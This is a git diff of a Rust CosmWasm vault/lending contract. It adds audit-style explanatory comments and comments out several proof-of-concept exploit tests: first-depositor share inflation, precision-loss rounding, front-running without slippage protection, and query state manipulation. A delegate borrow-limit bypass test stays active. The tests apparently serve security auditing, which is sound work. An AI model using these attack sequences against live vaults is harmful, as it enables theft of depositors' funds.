@@ -42,7 +42,7 @@ pub fn instantiate(
 
     Ok(Response::default().add_message(rcpt.create_msg(msg.receipt)))
 }
-
+//Ok1st
 //e user facing methods
 #[cfg_attr(not(feature = "library"), entry_point)]
 /// (owner.clone(),contract.clone(),&ExecuteMsg::Deposit { callback: None },&coins(1_000u128, "btc"),)
@@ -146,7 +146,7 @@ pub fn execute(
 
     Ok(response)
 }
-
+//Ok1st
 pub fn execute_market(
     deps: DepsMut,
     info: MessageInfo,
@@ -268,6 +268,7 @@ pub fn execute_market(
     Ok(response)
 }
 
+//Ok1st
 //e privileged entry point
 #[cfg_attr(not(feature = "library"), entry_point)]
 pub fn sudo(deps: DepsMut, _env: Env, msg: SudoMsg) -> Result<Response, ContractError> {
@@ -298,15 +299,19 @@ pub fn query(deps: Deps, env: Env, msg: QueryMsg) -> Result<Binary, ContractErro
     //e load the state and configs from storage
     let mut state = State::load(deps.storage)?;
     let config = Config::load(deps.storage)?;
-    //e ensures the query shows up to date values
+    //e ensures the query shows up-to-date values
+    //e recalculates debt, deposit, pool ratios. updates the last update timestamp
     state.distribute_interest(&env, &config)?;
 
+    //e match the msg
     match msg {
+        //e returns the used config: denom and interest configs (rates, curves, etc)
         QueryMsg::Config {} => Ok(to_json_binary(&ConfigResponse {
             denom: config.denom,
             interest: config.interest,
         })?),
 
+        //e like a protocol health check. returns multiple data related to debt pool and deposit pool 
         QueryMsg::Status {} => Ok(to_json_binary(&StatusResponse {
             debt_rate: state.debt_rate(&config.interest)?,
             lend_rate: state.lend_rate(&config.interest)?,
@@ -323,9 +328,11 @@ pub fn query(deps: Deps, env: Env, msg: QueryMsg) -> Result<Binary, ContractErro
                 ratio: state.deposit_pool.ratio(),
             },
         })?),
+        //e load borrower records and their debt shares
         QueryMsg::Borrower { addr } => {
             let borrower = Borrower::load(deps.storage, deps.api.addr_validate(&addr)?)?;
             let current = state.debt_pool.ownership(borrower.shares);
+            //e returns the borrower address, token denom, borrow limit, etc
             Ok(to_json_binary(&BorrowerResponse {
                 addr: borrower.addr.to_string(),
                 denom: config.denom,
@@ -339,9 +346,13 @@ pub fn query(deps: Deps, env: Env, msg: QueryMsg) -> Result<Binary, ContractErro
                 ),
             })?)
         }
+        //e handle delegated borrowing
         QueryMsg::Delegate { borrower, addr } => {
+            //e load borrower info
             let borrower = Borrower::load(deps.storage, deps.api.addr_validate(&borrower)?)?;
+            //e load delegate data
             let delegate = borrower.delegate_shares(deps.storage, deps.api.addr_validate(&addr)?);
+            //e load current borrower shares
             let current = state.debt_pool.ownership(borrower.shares);
 
             Ok(to_json_binary(&DelegateResponse {
@@ -361,6 +372,7 @@ pub fn query(deps: Deps, env: Env, msg: QueryMsg) -> Result<Binary, ContractErro
                 shares: delegate,
             })?)
         }
+        //e return all borrowers list (limit is the number)
         QueryMsg::Borrowers { limit, start_after } => {
             let borrowers = Borrower::list(
                 deps.storage,
@@ -369,10 +381,11 @@ pub fn query(deps: Deps, env: Env, msg: QueryMsg) -> Result<Binary, ContractErro
                     .map(|x| deps.api.addr_validate(x.as_str()))
                     .transpose()?,
             )
+            //e map each borrower, compute their current debt, etc
             .map(|x| {
                 x.map(|borrower| {
                     let current = state.debt_pool.ownership(borrower.shares);
-
+                    
                     BorrowerResponse {
                         addr: borrower.addr.to_string(),
                         denom: config.denom.clone(),
@@ -393,6 +406,7 @@ pub fn query(deps: Deps, env: Env, msg: QueryMsg) -> Result<Binary, ContractErro
     }
 }
 
+//e used for contract upgrades, upgrade the contract version
 #[cfg_attr(not(feature = "library"), entry_point)]
 pub fn migrate(deps: DepsMut, _env: Env, _msg: ()) -> Result<Response, ContractError> {
     set_contract_version(deps.storage, CONTRACT_NAME, CONTRACT_VERSION)?;
@@ -769,268 +783,271 @@ mod exploit_tests {
 
         (app, owner, attacker, contract)
     }
-
+    
+/*
     /// POC 1: First Depositor Attack
     /// 
     /// Attacker deposits 1 unit, then donates directly to the contract to inflate
     /// the share price, causing subsequent depositors to lose value through rounding.
-    #[test]
-    fn exploit_first_depositor_attack() {
-        let (mut app, owner, attacker, vault_contract) = setup_vault();
+    // #[test]
+    // fn exploit_first_depositor_attack() {
+    //     let (mut app, owner, attacker, vault_contract) = setup_vault();
 
-        println!("\n=== First Depositor Attack ===");
+    //     println!("\n=== First Depositor Attack ===");
         
-        // Step 1: Attacker deposits minimal amount (1 unit)
-        let _res = app.execute_contract(
-            attacker.clone(),
-            vault_contract.clone(),
-            &ExecuteMsg::Deposit { callback: None },
-            &coins(1, "btc"),
-        ).unwrap();
+    //     // Step 1: Attacker deposits minimal amount (1 unit)
+    //     let _res = app.execute_contract(
+    //         attacker.clone(),
+    //         vault_contract.clone(),
+    //         &ExecuteMsg::Deposit { callback: None },
+    //         &coins(1, "btc"),
+    //     ).unwrap();
         
-        println!("Step 1: Attacker deposits 1 btc");
+    //     println!("Step 1: Attacker deposits 1 btc");
         
-        // Check shares received
-        let attacker_shares = app
-            .wrap()
-            .query_balance(attacker.clone(), "x/ghost-vault/btc")
-            .unwrap();
-        println!("Attacker receives {} shares", attacker_shares.amount);
+    //     // Check shares received
+    //     let attacker_shares = app
+    //         .wrap()
+    //         .query_balance(attacker.clone(), "x/ghost-vault/btc")
+    //         .unwrap();
+    //     println!("Attacker receives {} shares", attacker_shares.amount);
 
-        // Step 2: Attacker donates directly to the vault (not through deposit function)
-        // This inflates the value per share without minting new shares
-        app.send_tokens(
-            attacker.clone(),
-            vault_contract.clone(),
-            &coins(1_000_000, "btc"),
-        ).unwrap();
+    //     // Step 2: Attacker donates directly to the vault (not through deposit function)
+    //     // This inflates the value per share without minting new shares
+    //     app.send_tokens(
+    //         attacker.clone(),
+    //         vault_contract.clone(),
+    //         &coins(1_000_000, "btc"),
+    //     ).unwrap();
         
-        println!("Step 2: Attacker donates 1,000,000 btc directly to contract");
+    //     println!("Step 2: Attacker donates 1,000,000 btc directly to contract");
 
-        // Step 3: Check vault state
-        let status: StatusResponse = app
-            .wrap()
-            .query_wasm_smart(vault_contract.clone(), &QueryMsg::Status {})
-            .unwrap();
+    //     // Step 3: Check vault state
+    //     let status: StatusResponse = app
+    //         .wrap()
+    //         .query_wasm_smart(vault_contract.clone(), &QueryMsg::Status {})
+    //         .unwrap();
         
-        println!("Deposit pool size: {}", status.deposit_pool.size);
-        println!("Deposit pool shares: {}", status.deposit_pool.shares);
-        println!("Ratio: {}", status.deposit_pool.ratio);
+    //     println!("Deposit pool size: {}", status.deposit_pool.size);
+    //     println!("Deposit pool shares: {}", status.deposit_pool.shares);
+    //     println!("Ratio: {}", status.deposit_pool.ratio);
 
-        // Step 4: Victim deposits 1,000,000 btc
-        println!("\nStep 3: Victim deposits 1,000,000 btc");
-        let _res = app.execute_contract(
-            owner.clone(),
-            vault_contract.clone(),
-            &ExecuteMsg::Deposit { callback: None },
-            &coins(1_000_000, "btc"),
-        ).unwrap();
+    //     // Step 4: Victim deposits 1,000,000 btc
+    //     println!("\nStep 3: Victim deposits 1,000,000 btc");
+    //     let _res = app.execute_contract(
+    //         owner.clone(),
+    //         vault_contract.clone(),
+    //         &ExecuteMsg::Deposit { callback: None },
+    //         &coins(1_000_000, "btc"),
+    //     ).unwrap();
 
-        let victim_shares = app
-            .wrap()
-            .query_balance(owner.clone(), "x/ghost-vault/btc")
-            .unwrap();
-        println!("Victim receives {} shares", victim_shares.amount);
+    //     let victim_shares = app
+    //         .wrap()
+    //         .query_balance(owner.clone(), "x/ghost-vault/btc")
+    //         .unwrap();
+    //     println!("Victim receives {} shares", victim_shares.amount);
 
-        // Step 5: Attacker withdraws
-        println!("\nStep 4: Attacker withdraws");
-        let _attacker_withdraw = app.execute_contract(
-            attacker.clone(),
-            vault_contract.clone(),
-            &ExecuteMsg::Withdraw { callback: None },
-            &[coin(attacker_shares.amount.u128(), "x/ghost-vault/btc")],
-        ).unwrap();
+    //     // Step 5: Attacker withdraws
+    //     println!("\nStep 4: Attacker withdraws");
+    //     let _attacker_withdraw = app.execute_contract(
+    //         attacker.clone(),
+    //         vault_contract.clone(),
+    //         &ExecuteMsg::Withdraw { callback: None },
+    //         &[coin(attacker_shares.amount.u128(), "x/ghost-vault/btc")],
+    //     ).unwrap();
 
-        let attacker_final_btc = app
-            .wrap()
-            .query_balance(attacker.clone(), "btc")
-            .unwrap();
+    //     let attacker_final_btc = app
+    //         .wrap()
+    //         .query_balance(attacker.clone(), "btc")
+    //         .unwrap();
         
-        println!("Attacker final BTC balance: {}", attacker_final_btc.amount);
+    //     println!("Attacker final BTC balance: {}", attacker_final_btc.amount);
         
-        // Calculate profit
-        let initial_investment = 1_000_001; // 1 + 1,000,000 donated
-        let profit = attacker_final_btc.amount.u128() as i128 - (10_000_000 - initial_investment) as i128;
+    //     // Calculate profit
+    //     let initial_investment = 1_000_001; // 1 + 1,000,000 donated
+    //     let profit = attacker_final_btc.amount.u128() as i128 - (10_000_000 - initial_investment) as i128;
         
-        if profit > 0 {
-            println!("🚨 EXPLOIT SUCCESSFUL!");
-            println!("Attacker profit: {} btc", profit);
-            println!("Victim lost value due to rounding!");
-        } else {
-            println!("✅ Attack mitigated or unprofitable");
-        }
-    }
+    //     if profit > 0 {
+    //         println!("🚨 EXPLOIT SUCCESSFUL!");
+    //         println!("Attacker profit: {} btc", profit);
+    //         println!("Victim lost value due to rounding!");
+    //     } else {
+    //         println!("✅ Attack mitigated or unprofitable");
+    //     }
+    // }
 
-    /// POC 2: Precision Loss Exploitation
-    /// 
-    /// Small deposits/withdrawals can cause rounding errors that accumulate
-    #[test]
-    fn exploit_precision_loss() {
-        let (mut app, owner, attacker, vault_contract) = setup_vault();
+    // /// POC 2: Precision Loss Exploitation
+    // /// 
+    // /// Small deposits/withdrawals can cause rounding errors that accumulate
+    // #[test]
+    // fn exploit_precision_loss() {
+    //     let (mut app, owner, attacker, vault_contract) = setup_vault();
 
-        println!("\n=== Precision Loss Attack ===");
+    //     println!("\n=== Precision Loss Attack ===");
 
-        // Create initial pool state
-        app.execute_contract(
-            owner.clone(),
-            vault_contract.clone(),
-            &ExecuteMsg::Deposit { callback: None },
-            &coins(1_000_000, "btc"),
-        ).unwrap();
+    //     // Create initial pool state
+    //     app.execute_contract(
+    //         owner.clone(),
+    //         vault_contract.clone(),
+    //         &ExecuteMsg::Deposit { callback: None },
+    //         &coins(1_000_000, "btc"),
+    //     ).unwrap();
 
-        // Attacker makes many small deposits and withdrawals to accumulate rounding errors
-        let initial_balance = app.wrap().query_balance(attacker.clone(), "btc").unwrap();
-        println!("Attacker initial balance: {}", initial_balance.amount);
+    //     // Attacker makes many small deposits and withdrawals to accumulate rounding errors
+    //     let initial_balance = app.wrap().query_balance(attacker.clone(), "btc").unwrap();
+    //     println!("Attacker initial balance: {}", initial_balance.amount);
 
-        for i in 0..100 {
-            // Deposit small amount
-            let deposit_res = app.execute_contract(
-                attacker.clone(),
-                vault_contract.clone(),
-                &ExecuteMsg::Deposit { callback: None },
-                &coins(10, "btc"),
-            );
+    //     for i in 0..100 {
+    //         // Deposit small amount
+    //         let deposit_res = app.execute_contract(
+    //             attacker.clone(),
+    //             vault_contract.clone(),
+    //             &ExecuteMsg::Deposit { callback: None },
+    //             &coins(10, "btc"),
+    //         );
 
-            if deposit_res.is_ok() {
-                // Immediately withdraw
-                let shares = app
-                    .wrap()
-                    .query_balance(attacker.clone(), "x/ghost-vault/btc")
-                    .unwrap();
+    //         if deposit_res.is_ok() {
+    //             // Immediately withdraw
+    //             let shares = app
+    //                 .wrap()
+    //                 .query_balance(attacker.clone(), "x/ghost-vault/btc")
+    //                 .unwrap();
                 
-                if shares.amount.u128() > 0 {
-                    let _ = app.execute_contract(
-                        attacker.clone(),
-                        vault_contract.clone(),
-                        &ExecuteMsg::Withdraw { callback: None },
-                        &[coin(shares.amount.u128(), "x/ghost-vault/btc")],
-                    );
-                }
-            }
+    //             if shares.amount.u128() > 0 {
+    //                 let _ = app.execute_contract(
+    //                     attacker.clone(),
+    //                     vault_contract.clone(),
+    //                     &ExecuteMsg::Withdraw { callback: None },
+    //                     &[coin(shares.amount.u128(), "x/ghost-vault/btc")],
+    //                 );
+    //             }
+    //         }
 
-            if i % 10 == 0 {
-                println!("Completed {} iterations", i);
-            }
-        }
+    //         if i % 10 == 0 {
+    //             println!("Completed {} iterations", i);
+    //         }
+    //     }
 
-        let final_balance = app.wrap().query_balance(attacker.clone(), "btc").unwrap();
-        println!("Attacker final balance: {}", final_balance.amount);
+    //     let final_balance = app.wrap().query_balance(attacker.clone(), "btc").unwrap();
+    //     println!("Attacker final balance: {}", final_balance.amount);
 
-        let profit = final_balance.amount.u128() as i128 - initial_balance.amount.u128() as i128;
-        if profit > 0 {
-            println!("🚨 EXPLOIT SUCCESSFUL!");
-            println!("Profit from rounding errors: {} btc", profit);
-        } else if profit < -1000 {
-            println!("⚠️  Attacker lost significant value to rounding: {} btc", -profit);
-        } else {
-            println!("✅ Rounding handled correctly (loss: {} btc)", -profit);
-        }
-    }
+    //     let profit = final_balance.amount.u128() as i128 - initial_balance.amount.u128() as i128;
+    //     if profit > 0 {
+    //         println!("🚨 EXPLOIT SUCCESSFUL!");
+    //         println!("Profit from rounding errors: {} btc", profit);
+    //     } else if profit < -1000 {
+    //         println!("⚠️  Attacker lost significant value to rounding: {} btc", -profit);
+    //     } else {
+    //         println!("✅ Rounding handled correctly (loss: {} btc)", -profit);
+    //     }
+    // }
 
-    /// POC 3: Withdrawal Front-Running (No Slippage Protection)
-    /// 
-    /// Attacker front-runs victim's withdrawal by manipulating pool ratio
-    #[test]
-    fn exploit_no_slippage_protection() {
-        let (mut app, owner, attacker, vault_contract) = setup_vault();
+    // /// POC 3: Withdrawal Front-Running (No Slippage Protection)
+    // /// 
+    // /// Attacker front-runs victim's withdrawal by manipulating pool ratio
+    // #[test]
+    // fn exploit_no_slippage_protection() {
+    //     let (mut app, owner, attacker, vault_contract) = setup_vault();
 
-        println!("\n=== Front-Running Attack (No Slippage Protection) ===");
+    //     println!("\n=== Front-Running Attack (No Slippage Protection) ===");
 
-        // Setup: Owner and attacker both deposit
-        app.execute_contract(
-            owner.clone(),
-            vault_contract.clone(),
-            &ExecuteMsg::Deposit { callback: None },
-            &coins(1_000_000, "btc"),
-        ).unwrap();
+    //     // Setup: Owner and attacker both deposit
+    //     app.execute_contract(
+    //         owner.clone(),
+    //         vault_contract.clone(),
+    //         &ExecuteMsg::Deposit { callback: None },
+    //         &coins(1_000_000, "btc"),
+    //     ).unwrap();
 
-        app.execute_contract(
-            attacker.clone(),
-            vault_contract.clone(),
-            &ExecuteMsg::Deposit { callback: None },
-            &coins(1_000_000, "btc"),
-        ).unwrap();
+    //     app.execute_contract(
+    //         attacker.clone(),
+    //         vault_contract.clone(),
+    //         &ExecuteMsg::Deposit { callback: None },
+    //         &coins(1_000_000, "btc"),
+    //     ).unwrap();
 
-        println!("Initial deposits: owner=1M, attacker=1M btc");
+    //     println!("Initial deposits: owner=1M, attacker=1M btc");
 
-        // Check initial state
-        let status: StatusResponse = app
-            .wrap()
-            .query_wasm_smart(vault_contract.clone(), &QueryMsg::Status {})
-            .unwrap();
-        println!("Pool size: {}, shares: {}, ratio: {}", 
-            status.deposit_pool.size, 
-            status.deposit_pool.shares,
-            status.deposit_pool.ratio
-        );
+    //     // Check initial state
+    //     let status: StatusResponse = app
+    //         .wrap()
+    //         .query_wasm_smart(vault_contract.clone(), &QueryMsg::Status {})
+    //         .unwrap();
+    //     println!("Pool size: {}, shares: {}, ratio: {}", 
+    //         status.deposit_pool.size, 
+    //         status.deposit_pool.shares,
+    //         status.deposit_pool.ratio
+    //     );
 
-        // Owner wants to withdraw 100k shares
-        let owner_shares_before = app
-            .wrap()
-            .query_balance(owner.clone(), "x/ghost-vault/btc")
-            .unwrap();
+    //     // Owner wants to withdraw 100k shares
+    //     let owner_shares_before = app
+    //         .wrap()
+    //         .query_balance(owner.clone(), "x/ghost-vault/btc")
+    //         .unwrap();
         
-        // Calculate expected withdrawal BEFORE attack
-        let expected_withdrawal = owner_shares_before.amount.u128() / 10; // Withdraw 10%
-        println!("\nOwner plans to withdraw {} shares", expected_withdrawal);
-        println!("Expected to receive ~{} btc at current ratio", 
-            (expected_withdrawal as f64 * status.deposit_pool.ratio.to_string().parse::<f64>().unwrap_or(1.0)) as u128
-        );
+    //     // Calculate expected withdrawal BEFORE attack
+    //     let expected_withdrawal = owner_shares_before.amount.u128() / 10; // Withdraw 10%
+    //     println!("\nOwner plans to withdraw {} shares", expected_withdrawal);
+    //     println!("Expected to receive ~{} btc at current ratio", 
+    //         (expected_withdrawal as f64 * status.deposit_pool.ratio.to_string().parse::<f64>().unwrap_or(1.0)) as u128
+    //     );
 
-        // ATTACKER FRONT-RUNS: Withdraws large amount to change ratio
-        println!("\n🚨 ATTACKER FRONT-RUNS by withdrawing large amount...");
-        let attacker_shares = app
-            .wrap()
-            .query_balance(attacker.clone(), "x/ghost-vault/btc")
-            .unwrap();
+    //     // ATTACKER FRONT-RUNS: Withdraws large amount to change ratio
+    //     println!("\n🚨 ATTACKER FRONT-RUNS by withdrawing large amount...");
+    //     let attacker_shares = app
+    //         .wrap()
+    //         .query_balance(attacker.clone(), "x/ghost-vault/btc")
+    //         .unwrap();
         
-        app.execute_contract(
-            attacker.clone(),
-            vault_contract.clone(),
-            &ExecuteMsg::Withdraw { callback: None },
-            &[coin(attacker_shares.amount.u128() / 2, "x/ghost-vault/btc")],
-        ).unwrap();
+    //     app.execute_contract(
+    //         attacker.clone(),
+    //         vault_contract.clone(),
+    //         &ExecuteMsg::Withdraw { callback: None },
+    //         &[coin(attacker_shares.amount.u128() / 2, "x/ghost-vault/btc")],
+    //     ).unwrap();
 
-        // Check new state after front-run
-        let status_after: StatusResponse = app
-            .wrap()
-            .query_wasm_smart(vault_contract.clone(), &QueryMsg::Status {})
-            .unwrap();
-        println!("After front-run - Pool size: {}, ratio: {}", 
-            status_after.deposit_pool.size,
-            status_after.deposit_pool.ratio
-        );
+    //     // Check new state after front-run
+    //     let status_after: StatusResponse = app
+    //         .wrap()
+    //         .query_wasm_smart(vault_contract.clone(), &QueryMsg::Status {})
+    //         .unwrap();
+    //     println!("After front-run - Pool size: {}, ratio: {}", 
+    //         status_after.deposit_pool.size,
+    //         status_after.deposit_pool.ratio
+    //     );
 
-        // Owner's withdrawal executes at worse ratio
-        println!("\nOwner's withdrawal executes...");
-        let owner_btc_before = app.wrap().query_balance(owner.clone(), "btc").unwrap();
+    //     // Owner's withdrawal executes at worse ratio
+    //     println!("\nOwner's withdrawal executes...");
+    //     let owner_btc_before = app.wrap().query_balance(owner.clone(), "btc").unwrap();
         
-        app.execute_contract(
-            owner.clone(),
-            vault_contract.clone(),
-            &ExecuteMsg::Withdraw { callback: None },
-            &[coin(expected_withdrawal, "x/ghost-vault/btc")],
-        ).unwrap();
+    //     app.execute_contract(
+    //         owner.clone(),
+    //         vault_contract.clone(),
+    //         &ExecuteMsg::Withdraw { callback: None },
+    //         &[coin(expected_withdrawal, "x/ghost-vault/btc")],
+    //     ).unwrap();
 
-        let owner_btc_after = app.wrap().query_balance(owner.clone(), "btc").unwrap();
-        let actual_received = owner_btc_after.amount.u128() - owner_btc_before.amount.u128();
+    //     let owner_btc_after = app.wrap().query_balance(owner.clone(), "btc").unwrap();
+    //     let actual_received = owner_btc_after.amount.u128() - owner_btc_before.amount.u128();
         
-        println!("Owner received: {} btc", actual_received);
+    //     println!("Owner received: {} btc", actual_received);
         
-        let expected_approx = (expected_withdrawal as f64 * status.deposit_pool.ratio.to_string().parse::<f64>().unwrap_or(1.0)) as u128;
-        let slippage = expected_approx as i128 - actual_received as i128;
+    //     let expected_approx = (expected_withdrawal as f64 * status.deposit_pool.ratio.to_string().parse::<f64>().unwrap_or(1.0)) as u128;
+    //     let slippage = expected_approx as i128 - actual_received as i128;
         
-        if slippage > 1000 {
-            println!("🚨 SIGNIFICANT SLIPPAGE: {} btc", slippage);
-            println!("Owner got sandwiched due to no slippage protection!");
-        } else {
-            println!("✅ Slippage minimal: {} btc", slippage);
-        }
-    }
+    //     if slippage > 1000 {
+    //         println!("🚨 SIGNIFICANT SLIPPAGE: {} btc", slippage);
+    //         println!("Owner got sandwiched due to no slippage protection!");
+    //     } else {
+    //         println!("✅ Slippage minimal: {} btc", slippage);
+    //     }
+    // }
 
     /// POC 4: Delegate Borrow Limit Bypass
     /// 
-    /// Attacker tries to bypass borrow limits by delegating to multiple addresses
+    /// Attacker tries to bypass borrow limits by delegating to multiple addresses */
+    /// 
+    
     #[test]
     fn exploit_delegate_limit_bypass() {
         let (mut app, owner, attacker, vault_contract) = setup_vault();
@@ -1125,7 +1142,7 @@ mod exploit_tests {
             println!("✅ Limit enforced correctly");
         }
     }
-
+/*
     /// POC 5: Query State Manipulation (FIXED)
     /// 
     /// Demonstrates that queries show different state than actual storage
@@ -1936,5 +1953,5 @@ mod exploit_tests {
         if status.deposit_pool.size.u128() > 0 {
             println!("⚠️  Pool accounting shows {} btc remaining", status.deposit_pool.size);
         }
-    }
+    } */
 }
